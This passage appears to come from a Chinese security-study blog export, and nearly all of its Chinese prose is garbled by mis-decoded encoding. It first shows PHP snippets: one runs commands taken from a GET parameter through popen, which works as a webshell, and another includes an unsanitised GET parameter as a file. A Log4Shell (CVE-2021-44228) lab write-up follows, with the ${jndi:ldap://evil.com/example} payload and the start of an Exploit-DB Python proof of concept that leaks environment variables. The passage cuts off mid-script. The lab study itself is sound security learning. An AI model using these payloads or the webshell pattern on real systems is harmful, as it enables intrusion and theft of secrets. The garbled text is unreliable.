<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">popen â€” æ‰“å¼€è¿›ç¨‹æ–‡ä»¶æŒ‡é’ˆã€‚æ‰“å¼€ä¸€ä¸ªæŒ‡å‘è¿›ç¨‹çš„ç®¡é“ï¼Œè¯¥è¿›ç¨‹ç”±æ´¾ç”Ÿç»™å®šçš„ command å‘½ä»¤æ‰§è¡Œè€Œäº§ç”Ÿ</span><br><span class="line">    </span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$test</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;h&#x27;</span>];</span><br><span class="line"><span class="variable">$fp</span> = <span class="title function_ invoke__">popen</span>(<span class="variable">$test</span>,<span class="string">&quot;r&quot;</span>);  <span class="comment">//popenæ‰“ä¸€ä¸ªè¿›ç¨‹é€šé“</span></span><br><span class="line"><span class="keyword">while</span> (!<span class="title function_ invoke__">feof</span>(<span class="variable">$fp</span>)) &#123;      <span class="comment">//ä»é€šé“å–å‡ºå†…å®¹</span></span><br><span class="line"><span class="variable">$out</span> = <span class="title function_ invoke__">fgets</span>(<span class="variable">$fp</span>, <span class="number">4096</span>);</span><br><span class="line"><span class="keyword">echo</span>  <span class="variable">$out</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">pclose</span>(<span class="variable">$fp</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="7-proc-open"><a href="#7-proc-open" class="headerlink" title="7) proc_open()"></a>7) proc_open()</h3><p>ç±»ä¼¼ popen() å‡½æ•°ï¼Œ ä½†æ˜¯ proc_open() æä¾›äº†æ›´åŠ å¼ºå¤§çš„æ§åˆ¶ç¨‹åºæ‰§è¡Œçš„èƒ½åŠ›</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">ç±»ä¼¼ <span class="title function_ invoke__">popen</span>() å‡½æ•°ï¼Œ ä½†æ˜¯ <span class="title function_ invoke__">proc_open</span>() æä¾›äº†æ›´åŠ å¼ºå¤§çš„æ§åˆ¶ç¨‹åºæ‰§è¡Œçš„èƒ½åŠ›</span><br><span class="line">    </span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$test</span> = <span class="string">&quot;whoami&quot;</span>;</span><br><span class="line"><span class="variable">$array</span> =   <span class="keyword">array</span>(</span><br><span class="line"><span class="keyword">array</span>(<span class="string">&quot;pipe&quot;</span>,<span class="string">&quot;r&quot;</span>),   <span class="comment">//æ ‡å‡†è¾“å…¥</span></span><br><span class="line"><span class="keyword">array</span>(<span class="string">&quot;pipe&quot;</span>,<span class="string">&quot;w&quot;</span>),   <span class="comment">//æ ‡å‡†è¾“å‡ºå†…å®¹</span></span><br><span class="line"><span class="keyword">array</span>(<span class="string">&quot;pipe&quot;</span>,<span class="string">&quot;w&quot;</span>)    <span class="comment">//æ ‡å‡†è¾“å‡ºé”™è¯¯</span></span><br><span class="line">);</span><br><span class="line"><span class="variable">$fp</span> = <span class="title function_ invoke__">proc_open</span>(<span class="variable">$test</span>,<span class="variable">$array</span>,<span class="variable">$pipes</span>);   <span class="comment">//æ‰“å¼€ä¸€ä¸ªè¿›ç¨‹é€šé“</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">stream_get_contents</span>(<span class="variable">$pipes</span>[<span class="number">1</span>]);    <span class="comment">//ä¸ºä»€ä¹ˆæ˜¯$pipes[1]ï¼Œå› ä¸º1æ˜¯è¾“å‡ºå†…å®¹</span></span><br><span class="line"><span class="title function_ invoke__">proc_close</span>(<span class="variable">$fp</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="8-åå•å¼•å·"><a href="#8-åå•å¼•å·" class="headerlink" title="8) åå•å¼•å·"></a>8) åå•å¼•å·</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> `whoami`; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="å››ã€æ–‡ä»¶åŒ…å«"><a href="#å››ã€æ–‡ä»¶åŒ…å«" class="headerlink" title="å››ã€æ–‡ä»¶åŒ…å«"></a>å››ã€æ–‡ä»¶åŒ…å«</h2><p>includeå°†ä¼šåŒ…å«è¯­å¥å¹¶æ‰§è¡ŒæŒ‡å®šæ–‡ä»¶ PHPçš„é…ç½®æ–‡ä»¶allowurlfopenå’Œallow_url_includeè®¾ç½®ä¸ºON  include&#x2F;requireç­‰åŒ…å«å‡½æ•°å¯ä»¥åŠ è½½è¿œç¨‹æ–‡ä»¶ include include_once requeire require_once  </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(__FILE);</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">include</span> <span class="variable">$file</span>; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="äº”ã€phpä¼ªåè®®ã€web-studyå·²è®°ã€‘"><a href="#äº”ã€phpä¼ªåè®®ã€web-studyå·²è®°ã€‘" class="headerlink" title="äº”ã€phpä¼ªåè®®ã€web-studyå·²è®°ã€‘"></a>äº”ã€<a href="../../../../Web-study">phpä¼ªåè®®ã€web-studyå·²è®°ã€‘</a></h2><h2 id="å…­ã€æ–‡ä»¶æ“ä½œç±»å¨èƒå‡½æ•°"><a href="#å…­ã€æ–‡ä»¶æ“ä½œç±»å¨èƒå‡½æ•°" class="headerlink" title="å…­ã€æ–‡ä»¶æ“ä½œç±»å¨èƒå‡½æ•°"></a>å…­ã€æ–‡ä»¶æ“ä½œç±»å¨èƒå‡½æ•°</h2><figure class="highlight scss"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="selector-class">.file_put_contents</span></span><br><span class="line"></span><br><span class="line"><span class="number">2</span><span class="selector-class">.file_put_contents</span>($file, $string);</span><br><span class="line"></span><br><span class="line"><span class="number">3</span><span class="selector-class">.copy</span> <span class="built_in">highlight_file</span>()</span><br><span class="line"></span><br><span class="line"><span class="number">4</span><span class="selector-class">.fopen</span>()</span><br><span class="line"></span><br><span class="line"><span class="number">5</span><span class="selector-class">.read</span> <span class="built_in">file</span>()</span><br><span class="line"></span><br><span class="line"><span class="number">6</span><span class="selector-class">.fread</span>()</span><br><span class="line"></span><br><span class="line"><span class="number">7</span><span class="selector-class">.fgetss</span>()</span><br><span class="line"></span><br><span class="line"><span class="number">8</span><span class="selector-class">.fgets</span>()</span><br><span class="line"></span><br><span class="line"><span class="number">9</span><span class="selector-class">.parse_ini_file</span>()</span><br><span class="line"></span><br><span class="line"><span class="number">10</span><span class="selector-class">.show_source</span>()</span><br><span class="line"></span><br><span class="line"><span class="number">11</span><span class="selector-class">.file</span>()</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>ç½‘ç»œå®‰å…¨å­¦ä¹ </category>
      </categories>
      <tags>
        <tag>ä»£ç å®¡è®¡</tag>
      </tags>
  </entry>
  <entry>
    <title>CVEæ¼æ´å­¦ä¹ </title>
    <url>//post/CVE-Test/</url>
    <content><![CDATA[<p><strong><code>æƒ³æŠŠä¸€äº›å¸¸è§çš„CVEä»¥åŠä¸€äº›ç»å…¸æ¼æ´å¤ç°ï¼Œåšåšç¬”è®°</code></strong></p>
<span id="more"></span>

<h1 id="CVE-2021-44228-Log4j2"><a href="#CVE-2021-44228-Log4j2" class="headerlink" title="CVE-2021-44228 Log4j2"></a>CVE-2021-44228 Log4j2</h1><h2 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h2><blockquote>
<p>Apache Log4j2 æ˜¯ä¸€ä¸ªè¢«å¹¿æ³›ä½¿ç”¨çš„å¼€æºæ—¥å¿—è®°å½•åº“ï¼Œ2017 å¹´ 7 æœˆæ—¶ï¼Œæœ‰äººå‘ Log4j2 æäº†æ”¯æŒ JNDI Lookup çš„éœ€æ±‚ï¼Œå¹¶ä» 2.0-beta9 ä¹‹åå¼€å§‹æ”¯æŒï¼›ä»Šå¹´é˜¿é‡Œçš„å®‰å…¨ç ”ç©¶äººå‘˜å‘ç°è¯¥ç‰¹æ€§ä¼šå¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œï¼Œäº 2021 å¹´ 11 æœˆ 24 æ—¥å‘ Apache æŠ¥å‘Šäº†è¯¥æ¼æ´ï¼›12 æœˆ 5 æ—¥å®˜æ–¹å‘å¸ƒäº†è¡¥ä¸ï¼›åˆ°äº† 12 æœˆ 9 æ—¥æ™šï¼ŒPoC çš„ä¼ æ’­èŒƒå›´å¼€å§‹å˜å¾—ä¸å¯æ§ï¼ŒåŸºæœ¬ä¸Šå„å¤§å‚å•†éƒ½å—å½±å“ï¼Œå½±å“èŒƒå›´å¾ˆå¹¿ï¼Œäºæ˜¯äººä»¬ç»™å®ƒèµ·äº†ä¸ªåå­—â€”â€”Log4Shellã€‚</p>
</blockquote>
<blockquote>
<p>ç¯å¢ƒæ­å»ºè™šæ‹Ÿæœºç‰ˆæœ¬: ubuntu 20.4<br>Apache solrç‰ˆæœ¬: 8.11.0</p>
</blockquote>
<h3 id="Apache-solr-8-11-0ä¸‹è½½"><a href="#Apache-solr-8-11-0ä¸‹è½½" class="headerlink" title="Apache solr 8.11.0ä¸‹è½½"></a>Apache solr 8.11.0ä¸‹è½½</h3><p>è¿™é‡Œæˆ‘é‡‡ç”¨çš„æ˜¯<code>Apache Solr</code>å¼€æºæœåŠ¡å™¨</p>
<blockquote>
<p>Solræ˜¯Apacheä¸‹çš„ä¸€ä¸ªé¡¶çº§å¼€æºé¡¹ç›®ï¼Œé‡‡ç”¨Javaå¼€å‘ï¼Œå®ƒæ˜¯åŸºäºLuceneçš„å…¨æ–‡æœç´¢æœåŠ¡å™¨ã€‚Solræä¾›äº†æ¯”Luceneæ›´ä¸ºä¸°å¯Œçš„æŸ¥è¯¢è¯­è¨€ï¼ŒåŒæ—¶å®ç°äº†å¯é…ç½®ã€å¯æ‰©å±•ï¼Œå¹¶å¯¹ç´¢å¼•ã€æœç´¢æ€§èƒ½è¿›è¡Œäº†ä¼˜åŒ–ã€‚</p>
</blockquote>
<p>é’ˆå¯¹æ¼æ´ä¿®å¤æ—¶é—´<code>[12 æœˆ 5 æ—¥]</code>ï¼Œå’Œå®˜æ–¹æ›´æ–°æ–‡æ¡£</p>
<p><img src="/post/CVE-Test/image-20221201005804892.png" alt="image-20221201005804892"></p>
<p><code>Apache Solr 8.11.0</code>æ˜¯<code>CVE-2021-44228</code>ä¿®å¤å‰çš„æœ€åçš„ä¸€ä¸ªç‰ˆæœ¬</p>
<p>æ‰€ä»¥è¯¥ç‰ˆæœ¬ä¹Ÿå­˜åœ¨<code>CVE-2021-44228</code></p>
<p>äºæ˜¯ä¸‹è½½</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">https</span>://archive.apache.org/dist/lucene/solr/<span class="number">8</span>.<span class="number">11</span>.<span class="number">0</span>/</span><br></pre></td></tr></table></figure>

<p><img src="/post/CVE-Test/image-20221201010242171.png" alt="image-20221201010242171"></p>
<h3 id="JAVAé…ç½®"><a href="#JAVAé…ç½®" class="headerlink" title="JAVAé…ç½®"></a>JAVAé…ç½®</h3><p>ç”±äº<code>Apache solr</code>æ˜¯åŸºäº<code>Java</code>å¼€å‘çš„é¡¹ç›®ï¼Œæ‰€ä»¥éœ€è¦å…ˆä¸‹è½½å¯¹åº”ç‰ˆæœ¬çš„<code>Java</code></p>
<p><strong>ä½†æ˜¯é’ˆå¯¹log4j2å­˜åœ¨çš„ç‰ˆæœ¬ï¼Œéœ€è¦jdk1.8.0æ‰å¯ä»¥å¤ç°</strong></p>
<p>ä½†æ˜¯</p>
<blockquote>
<p>é«˜ç‰ˆæœ¬çš„JDKç¯å¢ƒä¸­<code>trustURLCodebase</code>å˜é‡ä¸ºfalseï¼Œé™åˆ¶äº†è¿œç¨‹ç±»çš„åŠ è½½ï¼Œå¯¼è‡´<code>JNDI</code>æ³¨å…¥åˆ©ç”¨å¤±è´¥ï¼Œæ— æ³•åå¼¹shell<br>èƒ½å®ç°åˆ©ç”¨æ¡ä»¶ï¼šç‰ˆæœ¬â‰¤ <code>JDK 6u211ã€7u201ã€ 8u191ã€11.0.1</code>ã€‚<br>ä½†æ˜¯è¿‡ä½ç‰ˆæœ¬çš„ï¼Œsolrè¿è¡Œå¯èƒ½ä¼šå‡ºé”™</p>
</blockquote>
<p>æ‰€ä»¥è¿™é‡Œä»å®˜ç½‘ä¸‹è½½ä¸“é—¨çš„<code>8u171</code></p>
<h4 id="è§£å‹åˆ°å¯¹åº”ç›®å½•"><a href="#è§£å‹åˆ°å¯¹åº”ç›®å½•" class="headerlink" title="è§£å‹åˆ°å¯¹åº”ç›®å½•"></a>è§£å‹åˆ°å¯¹åº”ç›®å½•</h4><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">tar -zxvf jdk-<span class="number">8</span>u171-linux-x64.tar.gz -C <span class="regexp">/usr/</span>local<span class="regexp">/jdk/</span></span><br></pre></td></tr></table></figure>

<p><img src="/post/CVE-Test/image-20221221161421513.png" alt="image-20221221161421513"></p>
<h4 id="éƒ¨ç½²å¹¶ä¿®æ”¹ç¯å¢ƒå˜é‡"><a href="#éƒ¨ç½²å¹¶ä¿®æ”¹ç¯å¢ƒå˜é‡" class="headerlink" title="éƒ¨ç½²å¹¶ä¿®æ”¹ç¯å¢ƒå˜é‡"></a>éƒ¨ç½²å¹¶ä¿®æ”¹ç¯å¢ƒå˜é‡</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo vi ~/.bashrc</span><br><span class="line">åœ¨æ–‡ä»¶æœ«å°¾è¿½åŠ ä¸‹é¢4è¡Œå†…å®¹</span><br><span class="line"><span class="comment">## è¿™é‡Œè¦æ³¨æ„ç›®å½•è¦æ¢æˆè‡ªå·±è§£å‹çš„jdk ç›®å½•</span></span><br><span class="line"><span class="built_in">export</span> JAVA_HOME=/usr/local/jdk/jdk1.8.0_171 </span><br><span class="line"><span class="built_in">export</span> JRE_HOME=<span class="variable">$&#123;JAVA_HOME&#125;</span>/jre  </span><br><span class="line"><span class="built_in">export</span> CLASSPATH=.:<span class="variable">$&#123;JAVA_HOME&#125;</span>/lib:<span class="variable">$&#123;JRE_HOME&#125;</span>/lib  </span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$&#123;JAVA_HOME&#125;</span>/bin:<span class="variable">$PATH</span></span><br><span class="line"><span class="comment">#ä½¿å…¶ä¸Šé¢ç¯å¢ƒå˜é‡è®¾ç½®ç”Ÿæ•ˆ</span></span><br><span class="line"><span class="built_in">source</span> ~/.bashrc</span><br><span class="line">sudo update-alternatives --install /usr/bin/java java /usr/local/jdk/jdk1.8.0_171/bin/java 300</span><br></pre></td></tr></table></figure>

<h4 id="æŸ¥çœ‹ç‰ˆæœ¬"><a href="#æŸ¥çœ‹ç‰ˆæœ¬" class="headerlink" title="æŸ¥çœ‹ç‰ˆæœ¬"></a>æŸ¥çœ‹ç‰ˆæœ¬</h4><figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line">java -<span class="built_in">version</span></span><br></pre></td></tr></table></figure>

<p><img src="/post/CVE-Test/image-20221221161638879.png" alt="image-20221221161638879"></p>
<h3 id="Solrä¸‹è½½"><a href="#Solrä¸‹è½½" class="headerlink" title="Solrä¸‹è½½"></a><code>Solr</code>ä¸‹è½½</h3><p>ä¸‹è½½<code>solr 8.11.0</code></p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">sudo</span> wget https://archive.apache.org/dist/lucene/solr/<span class="number">8</span>.<span class="number">11</span>.<span class="number">0</span>/solr-<span class="number">8</span>.<span class="number">11</span>.<span class="number">0</span>.tgz</span><br></pre></td></tr></table></figure>

<p><img src="/post/CVE-Test/image-20221201111930502.png" alt="image-20221201111930502"></p>
<p><img src="/post/CVE-Test/image-20221201112302036.png" alt="image-20221201112302036"></p>
<p>ç„¶åå°±è§£å‹</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">sudo</span> tar xzf solr-<span class="number">8</span>.<span class="number">11</span>.<span class="number">0</span>.tgz</span><br></pre></td></tr></table></figure>

<p><img src="/post/CVE-Test/image-20221201112554067-1671632324475-1.png" alt="image-20221201112554067"></p>
<h3 id="å®‰è£…-Apache-SolræœåŠ¡"><a href="#å®‰è£…-Apache-SolræœåŠ¡" class="headerlink" title="å®‰è£… Apache SolræœåŠ¡"></a>å®‰è£… <code>Apache Solr</code>æœåŠ¡</h3><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">sudo</span> bash solr-<span class="number">8</span>.<span class="number">11</span>.<span class="number">0</span>/bin/install_solr_service.sh solr-<span class="number">8</span>.<span class="number">11</span>.<span class="number">0</span>.tgz</span><br></pre></td></tr></table></figure>

<p><img src="/post/CVE-Test/image-20221201112725299.png" alt="image-20221201112725299"></p>
<p>æŸ¥çœ‹æœåŠ¡çŠ¶æ€</p>
<figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">sudo systemctl status solr</span></span><br></pre></td></tr></table></figure>

<p><img src="/post/CVE-Test/image-20221201112839632.png" alt="image-20221201112839632"></p>
<p>å‘ç°æœåŠ¡å·²ç»å­˜åœ¨</p>
<p>å¯åŠ¨</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo /lib/systemd/systemd-sysv-install <span class="built_in">enable</span> solr</span><br><span class="line"><span class="comment">#è‹¥æ‰§è¡Œsudo systemctl enable solrä¼šæç¤ºä¸æ˜¯æœ¬æœºæœåŠ¡ï¼Œéœ€è¦æŒ‰ä¸Šé¢æ–¹å¼å¯åŠ¨è¿è¡Œ</span></span><br></pre></td></tr></table></figure>

<p>å› ä¸º<code>solr</code>é»˜è®¤è¿è¡Œçš„ç«¯å£ä¸º<code>8983</code></p>
<p>æŸ¥çœ‹ç¯å¢ƒæ­å»ºçš„è™šæ‹Ÿæœº<code>ip</code></p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">ip <span class="selector-tag">a</span></span><br></pre></td></tr></table></figure>

<p><img src="/post/CVE-Test/image-20221201113319037.png" alt="image-20221201113319037"></p>
<p>å¾—åˆ°ç¯å¢ƒæ­å»ºé¶æœº<code>ip</code>ä¸º</p>
<figure class="highlight accesslog"><table><tr><td class="code"><pre><span class="line"><span class="number">192.168.80.131</span></span><br></pre></td></tr></table></figure>

<h3 id="æˆåŠŸ"><a href="#æˆåŠŸ" class="headerlink" title="æˆåŠŸ"></a>æˆåŠŸ</h3><p>æµè§ˆå™¨è®¿é—®</p>
<figure class="highlight dts"><table><tr><td class="code"><pre><span class="line"><span class="symbol">http:</span><span class="comment">//192.168.80.131:8983</span></span><br></pre></td></tr></table></figure>

<p><img src="/post/CVE-Test/image-20221220220624019.png" alt="image-20221220220624019"></p>
<p>æ­å»ºæˆåŠŸ</p>
<p>å†…ç½‘ç¯å¢ƒä¸­çš„æ”»å‡»æœºä¹ŸæˆåŠŸè®¿é—®</p>
<p><img src="/post/CVE-Test/image-20221201115827107.png" alt="image-20221201115827107"></p>
<p>ç¯å¢ƒæ­å»ºå®Œæ¯•</p>
<h2 id="äº†è§£æ¼æ´æè¿°ä¸æ³¨å…¥åŸç†"><a href="#äº†è§£æ¼æ´æè¿°ä¸æ³¨å…¥åŸç†" class="headerlink" title="äº†è§£æ¼æ´æè¿°ä¸æ³¨å…¥åŸç†"></a><strong>äº†è§£æ¼æ´æè¿°ä¸æ³¨å…¥åŸç†</strong></h2><p><code>Apache Log4j 2</code> æ˜¯<code>Java</code>è¯­è¨€çš„æ—¥å¿—å¤„ç†å¥—ä»¶ï¼Œä½¿ç”¨æä¸ºå¹¿æ³›ã€‚åœ¨å…¶<code>2.0</code>åˆ°<code>2.14.1</code>ç‰ˆæœ¬ä¸­å­˜åœ¨ä¸€å¤„<code>JNDI</code>æ³¨å…¥æ¼</p>
<p>æ´ï¼Œæ”»å‡»è€…åœ¨å¯ä»¥æ§åˆ¶æ—¥å¿—å†…å®¹çš„æƒ…å†µä¸‹ï¼Œé€šè¿‡ä¼ å…¥ç±»ä¼¼äº</p>
<p><code>$&#123;jndi:ldap://evil.com/example&#125;</code>çš„<code>lookup</code>ç”¨äºè¿›è¡Œ<code>JNDI</code>æ³¨å…¥ï¼Œæ‰§è¡Œä»»æ„ä»£ç ã€‚</p>
<h3 id="Log4j2-Lookup"><a href="#Log4j2-Lookup" class="headerlink" title="Log4j2 Lookup"></a>Log4j2 Lookup</h3><p><code>Log4j2</code> <code>Lookup</code>æ˜¯<code>Log4j2</code>çš„ä¸€é¡¹åŠŸèƒ½ï¼Œå…è®¸æ‚¨<strong>åœ¨æ—¥å¿—æ¶ˆæ¯ä¸­ä½¿ç”¨åŠ¨æ€å€¼</strong>ï¼Œ<code>Log4j2</code>æä¾›äº†è®¸å¤šå†…ç½®çš„<code>Lookup</code>å¯¹</p>
<p>è±¡ï¼Œç”¨äºæŸ¥æ‰¾ä¸åŒç±»å‹çš„å€¼</p>
<p>ä¾‹å¦‚<code>SystemPropertiesLookup.lookup(&quot;user.home&quot;)</code>æ–¹æ³•è¿”å›äº†ç³»ç»Ÿå±æ€§<code>user.home</code>çš„å€¼ï¼Œå¹¶å°†å…¶æ’å…¥æ—¥å¿—</p>
<p>æ¶ˆæ¯ä¸­ã€‚</p>
<h3 id="JNDI"><a href="#JNDI" class="headerlink" title="JNDI"></a>JNDI</h3><p>å¼€å§‹æˆ‘ä¹Ÿçœ‹ä¸å¤ªæ‡‚<code>JNDI</code>ä»»æ„ä»£ç æ‰§è¡Œè¯­å¥æ„æ€</p>
<p>å…ˆäº†è§£ä¸€ä¸‹<code>JNDI</code>æ˜¯ä»€ä¹ˆä»¥åŠå…¶ç»„æˆ</p>
<p><code>JNDI</code>ï¼ˆ<code>Java</code>å‘½åå’Œç›®å½•æ¥å£ï¼‰ï¼Œæ˜¯<code>Java</code>æä¾›çš„ä¸€ä¸ªç›®å½•æœåŠ¡åº”ç”¨ç¨‹åºæ¥å£ï¼ˆ<code>API</code>ï¼‰</p>
<p>å®ƒæä¾›ä¸€ä¸ªç›®å½•ç³»ç»Ÿï¼Œå¹¶å°†æœåŠ¡åç§°ä¸å¯¹è±¡å…³è”èµ·æ¥ï¼Œä»è€Œä½¿å¾—å¼€å‘äººå‘˜åœ¨å¼€å‘è¿‡ç¨‹ä¸­å¯ä»¥ä½¿ç”¨åç§°æ¥è®¿é—®å¯¹è±¡ </p>
<blockquote>
<p>å…¶ä¸­å¤§è‡´æœ‰<br>è¿œç¨‹æ–¹æ³•è°ƒç”¨ï¼ˆ<code>RMI</code>ï¼‰ï¼Œé€šç”¨å¯¹è±¡è¯·æ±‚ä»£ç†ä½“ç³»ç»“æ„ï¼ˆ<code>CORBA</code>ï¼‰ï¼Œè½»å‹ç›®å½•è®¿é—®åè®®ï¼ˆ<code>LDAP</code>ï¼‰æˆ–åŸŸåæœåŠ¡ï¼ˆ<code>DNS</code>ï¼‰</p>
</blockquote>
<p>å…¶å¤§è‡´ç»„æˆä¸º</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String jndiName= ...;<span class="comment">//æŒ‡å®šéœ€è¦æŸ¥æ‰¾nameåç§°</span></span><br><span class="line"><span class="type">Context</span> <span class="variable">context</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();<span class="comment">//åˆå§‹åŒ–é»˜è®¤ç¯å¢ƒ</span></span><br><span class="line"><span class="type">DataSource</span> <span class="variable">ds</span> <span class="operator">=</span> (DataSourse)context.lookup(jndiName);<span class="comment">//æŸ¥æ‰¾è¯¥nameçš„æ•°æ®</span></span><br></pre></td></tr></table></figure>

<p><u><strong>æ‰€ä»¥å¦‚æœèƒ½æ§åˆ¶<code>jndiName</code>ï¼Œå†åˆ©ç”¨<code>rmi</code>ä¹‹ç±»çš„åŠ è½½è¿œç¨‹æ¶æ„ç±»ï¼Œä»è€Œæ‰§è¡Œæ¶æ„ç±»çš„å‘½ä»¤ï¼Œæ•…è€Œå®ç°è¿œç¨‹ä»£ç æ‰§è¡Œ</strong></u></p>
<h3 id="JNDIæ³¨å…¥"><a href="#JNDIæ³¨å…¥" class="headerlink" title="JNDIæ³¨å…¥"></a>JNDIæ³¨å…¥</h3><p>ç»“åˆ<code>lookup</code>å’Œ<code>jndi</code></p>
<p><strong>å¯¹äº<code>payload</code></strong></p>
<p><code>$&#123;jndi:ldap://evil.com/example&#125;</code>æ˜¯<code>Log4j2</code>ä¸­ä½¿ç”¨çš„<strong>å ä½ç¬¦</strong>è¯­æ³•ã€‚<strong>å®ƒè¡¨ç¤ºåœ¨æ—¥å¿—æ¶ˆæ¯ä¸­æ’å…¥ä¸€ä¸ªä½¿ç”¨</strong></p>
<p><strong><code>JNDILookup</code>å¯¹è±¡æŸ¥æ‰¾çš„å€¼</strong></p>
<p><code>ldap://evil.com/example</code>æ˜¯<code>JNDI</code>æŸ¥æ‰¾æ‰€ä½¿ç”¨çš„åç§°ã€‚è¿™æ„å‘³ç€<code>Log4j2</code>å°†åœ¨<code>JNDI</code>ä¸Šä¸‹æ–‡ä¸­æŸ¥æ‰¾åä¸º<code>example</code></p>
<p>çš„å¯¹è±¡ï¼Œè¯¥å¯¹è±¡ä½äº<code>evil.com</code>æœåŠ¡å™¨ä¸Šï¼Œå°±å¯èƒ½å®ç°è®¿é—®ä¸€äº›æ•æ„Ÿä¿¡æ¯ä»¥åŠå…¶ä»–æ¶æ„æ“ä½œçš„ç›®çš„</p>
<h2 id="è„šæœ¬åˆ†æ"><a href="#è„šæœ¬åˆ†æ" class="headerlink" title="è„šæœ¬åˆ†æ"></a>è„šæœ¬åˆ†æ</h2><p>è¿™é‡Œè°ƒç”¨**<code>exploitdb</code>**ä¸­çš„å¯¹<code>Log4j2</code>åˆ©ç”¨çš„è„šæœ¬ï¼Œè¿™æ˜¯ä¸€ä¸ªä¿¡æ¯æ³„éœ²çš„è„šæœ¬</p>
<p>å‘å¸ƒæ—¶é—´: <code>12/12/2021</code></p>
<p><code>ã€ps.è¿™ä¸ªè„šæœ¬å¯èƒ½æ˜¯ä½œè€…ä¸Šä¼ åˆ°expçš„æ—¶å€™ç©ºæ ¼é—®é¢˜ï¼Œéœ€è¦ç¨å¾®ä¿®æ”¹ä¸€ä¸‹å°±å¯ä»¥ç”¨äº†ã€‘</code></p>
<p><img src="/post/CVE-Test/image-20221204224323306-1671800988704-1.png" alt="image-20221204224323306"></p>
<p>è„šæœ¬å†…å®¹</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Exploit Title: Apache Log4j2 2.14.1 - Information Disclosure</span></span><br><span class="line"><span class="comment"># Date: 12/12/2021</span></span><br><span class="line"><span class="comment"># Exploit Author: leonjza</span></span><br><span class="line"><span class="comment"># Vendor Homepage: https://logging.apache.org/log4j/2.x/</span></span><br><span class="line"><span class="comment"># Version: &lt;= 2.14.1</span></span><br><span class="line"><span class="comment"># CVE: CVE-2021-44228</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Pure python ENV variable leak PoC for CVE-2021-44228</span></span><br><span class="line"><span class="comment"># Original PoC: https://twitter.com/Black2Fan/status/1470281005038817284</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># 2021 @leonjza</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> socketserver</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">LDAP_HEADER = <span class="string">b&#x27;\x30\x0c\x02\x01\x01\x61\x07\x0a\x01\x00\x04\x00\x04\x00\x0a&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ThreadedTCPRequestHandler</span>(socketserver.BaseRequestHandler):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">handle</span>(<span class="params">self</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27; i| new connection from <span class="subst">&#123;self.client_address[<span class="number">0</span>]&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        sock = self.request</span><br><span class="line">        sock.recv(<span class="number">1024</span>)</span><br><span class="line">        sock.sendall(LDAP_HEADER)</span><br><span class="line"></span><br><span class="line">        data = sock.recv(<span class="number">1024</span>)</span><br><span class="line">        data = data[<span class="number">9</span>:]  <span class="comment"># strip header</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># example response</span></span><br><span class="line">        <span class="comment">#</span></span><br><span class="line">        <span class="comment"># (&#x27;Java version 11.0.13\n&#x27;</span></span><br><span class="line">        <span class="comment">#  &#x27;\x01\x00\n&#x27;</span></span><br><span class="line">        <span class="comment">#  &#x27;\x01\x03\x02\x01\x00\x02\x01\x00\x01\x01\x00\x0b&#x27;</span></span><br><span class="line">        <span class="comment">#  &#x27;objectClass0\x00\x1b0\x19\x04\x172.16.840.1.113730.3.4.2&#x27;)</span></span><br><span class="line"></span><br><span class="line">        data = data.decode(errors=<span class="string">&#x27;ignore&#x27;</span>).split(<span 